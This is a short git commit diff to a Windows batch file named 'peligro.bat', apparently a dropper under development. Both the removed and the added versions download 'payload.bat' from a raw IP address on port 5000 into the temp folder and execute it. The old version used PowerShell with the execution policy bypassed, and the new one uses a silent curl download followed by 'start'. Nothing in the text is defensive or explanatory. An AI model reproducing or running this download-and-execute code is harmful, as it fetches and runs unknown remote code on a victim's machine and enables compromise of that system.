7f5c62a71dde88d73bb8196747fe9a0f18f5446b
AnthonyGrullonA <anthonygrulon283@gmail.com>
2026-04-12 23:32:17 -0400

    otroma

--- peligro.bat
+++ peligro.bat
@@ -1,8 +1,9 @@
 @echo off
 set URL=http://82.29.153.101:5000/payload.bat
-set FILE=%temp%\sys.bat
+set FILE=%temp%\sc.bat
 
-powershell -NoP -ExecutionPolicy Bypass -Command ^
-"$r = Invoke-WebRequest '%URL%' -UseBasicParsing; $r.Content | Set-Content -Encoding ASCII '%FILE%'"
+curl -s -o "%FILE%" "%URL%"
 
-call "%FILE%"
+if exist "%FILE%" (
+    start "" "%FILE%"
+)
